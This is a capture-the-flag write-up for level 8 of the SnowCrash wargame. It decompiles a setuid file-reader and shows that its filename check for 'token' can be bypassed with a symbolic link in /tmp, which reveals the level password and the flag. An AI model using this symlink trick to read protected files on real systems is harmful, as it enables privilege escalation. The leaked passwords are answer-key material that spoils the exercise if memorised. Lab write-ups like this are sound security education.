# Level 08

Level 8 contains two files a setuid binary and a token file:

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$
```

the level08 binary takes a file as argument and shows it's content

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ ./level08 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
```

here is pseudo code from binary ninja
```c
08048554  int32_t main(int32_t argc, char** argv, char** envp)

0804856a      char** var_428 = envp
0804856e      void* gsbase
0804856e      int32_t eax_2 = *(gsbase + 0x14)
08048581      if (argc == 1)
08048595          printf(format: "%s [file to read]\n", *argv)
080485a1          exit(status: 1)
080485a1          noreturn
080485c1      if (strstr(haystack: argv[1], needle: "token") != 0)
080485d8          printf(format: "You may not access '%s'\n", argv[1])
080485e4          exit(status: 1)
080485e4          noreturn
080485fd      int32_t eax_14 = open(file: argv[1], oflag: 0)
0804860b      if (eax_14 == 0xffffffff)
08048629          err(eval: 1, fmt: "Unable to open %s", argv[1])
08048629          noreturn
08048645      void var_414
08048645      ssize_t eax_19 = read(fd: eax_14, buf: &var_414, nbytes: 0x400)
08048653      if (eax_19 == 0xffffffff)
0804866c          err(eval: 1, fmt: "Unable to read fd %d", eax_14)
0804866c          noreturn
08048688      ssize_t eax_22 = write(fd: 1, buf: &var_414, nbytes: eax_19)
0804869b      if (eax_2 == *(gsbase + 0x14))
080486a3          return eax_22
0804869d      __stack_chk_fail()
0804869d      noreturn
```

we can exploit this in two ways, we can create a symbolic link to the file token and try to read it, or simply patch the binary to remove the check for the string "token" and read the file directly but since this is a setuid binary we can't modify it, so we will go with the first option.

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/bruh
level08@SnowCrash:~$ ./level08 /tmp/bruh
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```



